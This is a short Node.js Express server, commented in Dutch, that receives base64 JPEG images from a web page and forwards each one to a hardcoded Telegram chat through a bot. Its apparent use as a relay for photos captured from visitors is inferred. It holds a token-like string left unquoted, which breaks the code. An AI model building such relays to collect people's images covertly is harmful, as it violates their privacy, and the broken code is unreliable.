const express = require('express');
const { Telegraf } = require('telegraf');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();

// 1. PLAK HIER JOUW HTTP API TOKEN VAN BOTFATHER (tussen de quotes):
const bot = new Telegraf(AAETz6RvUKZS2pm4JQd7DJqgc2Ht2hFhNlE);

// 2. PLAK HIER JOUW USER ID VAN USERINFOBOT (zonder quotes, puur het getal):
const MIJN_TELEGRAM_ID = 123456789; 

app.use(bodyParser.json({ limit: '10mb' }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/upload-photo', (req, res) => {
    try {
        const base64Data = req.body.image.replace(/^data:image\/jpeg;base64,/, "");
        const imageBuffer = Buffer.from(base64Data, 'base64');

        bot.telegram.sendPhoto(822876252, { source: imageBuffer })
            .then(() => res.json({ success: true }))
            .catch(err => {
                console.error("Telegram fout:", err);
                res.status(500).json({ error: "Niet verzonden" });
            });
    } catch (e) {
        res.status(500).json({ error: "Serverfout" });
    }
});

bot.launch();
app.listen(process.env.PORT || 3000, () => {
    console.log('Server actief!');
});
